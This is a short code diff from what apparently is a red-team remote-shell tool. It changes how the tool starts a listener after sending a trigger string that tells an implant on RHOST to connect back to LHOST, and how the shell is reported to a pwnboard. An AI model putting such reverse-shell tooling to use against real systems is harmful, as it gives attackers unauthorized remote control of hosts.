@@ -70,6 +70,8 @@ def listen(params):
     except socket.gaierror:
         print(colored(f"[-] Potentially invalid: {params.get('LHOST')}.", "red"))
         return
+    except KeyboardInterrupt:
+        pass    
     
     if baseparams["PWNBOARD"] is not None:
         updatePwnboard(params["RHOST"], "shell")
@@ -242,16 +244,10 @@ def executeShell(send=False):
     if verify(shellparams):
         ip = shellparams["RHOST"]
         plaintext = "FC-SH-{}\00".format(shellparams["LHOST"])
-        if not send:
-            t = multiprocessing.Process(target=listen, args=(shellparams,))
-            t.start() # start listener
         print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
         execute(plaintext, shellparams)
         if not send:
-            try:
-                t.join() # wait until thread is finished
-            except KeyboardInterrupt:
-                t.terminate()
+            listen(shellparams)
 
 def executeCmd():
     if verify(cmdparams):
